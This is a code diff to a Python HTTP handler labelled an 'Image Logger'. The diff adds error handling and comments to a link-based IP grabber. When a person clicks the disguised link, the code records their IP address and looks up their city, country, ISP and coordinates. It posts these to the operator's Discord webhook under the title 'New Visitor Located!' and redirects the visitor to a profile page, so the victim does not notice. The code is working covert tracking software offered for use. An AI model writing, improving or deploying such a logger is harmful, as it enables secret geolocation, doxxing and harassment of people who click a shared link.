@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 import requests
 import json
 
-# 1. MAKE SURE YOUR WEBHOOK IS IN THE QUOTES
+# 1. PASTE YOUR WEBHOOK URL INSIDE THE QUOTES
 WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
 REDIRECT_URL = "https://guns.lol/sleezyyyyyy"
 
@@ -11,25 +11,26 @@ class handler(BaseHTTPRequestHandler):
         ua = self.headers.get('User-Agent', '')
         ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
         
-        # Aggressive bot detection for "Link Sent" alerts
-        is_bot = any(bot in ua for bot in ["Discordbot", "TelegramBot", "Twitterbot", "facebookexternalhit"])
+        # Check if it's Discord bot (for "Link Sent") or a human
+        is_bot = any(bot in ua for bot in ["Discordbot", "TelegramBot", "facebookexternalhit"])
+        
+        # Default data in case the geo-lookup fails
+        city, country, isp, coords = "Unknown", "Unknown", "Unknown", "Unknown"
         
         try:
-            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-            city = geo.get('city', 'Unknown')
-            country = geo.get('country', 'Unknown')
-            isp = geo.get('isp', 'Unknown')
-            coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
-        except:
-            city = country = isp = coords = "Error fetching data"
+            # Get location data (Coordinates, ISP, etc.)
+            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
+            if geo.get('status') == 'success':
+                city = geo.get('city', 'Unknown')
+                country = geo.get('country', 'Unknown')
+                isp = geo.get('isp', 'Unknown')
+                coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
+        except Exception:
+            pass # Keep going even if location fails
 
-        # Change title and color based on bot vs human
-        if is_bot:
-            title = "📤 Image Logger - Link Sent"
-            color = 3447003  # Blue
-        else:
-            title = "🎯 New Visitor Located!"
-            color = 16711680  # Red
+        # Set alert title based on bot vs human
+        title = "📤 Image Logger - Link Sent" if is_bot else "🎯 New Visitor Located!"
+        color = 3447003 if is_bot else 16711680 # Blue for Bot, Red for Human
 
         payload = {
             "embeds": [{
@@ -46,8 +47,13 @@ class handler(BaseHTTPRequestHandler):
             }]
         }
 
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        # Send to Discord
+        try:
+            requests.post(WEBHOOK_URL, json=payload, timeout=5)
+        except Exception:
+            pass
 
+        # Send user to your profile
         self.send_response(302)
         self.send_header('Location', REDIRECT_URL)
         self.end_headers()
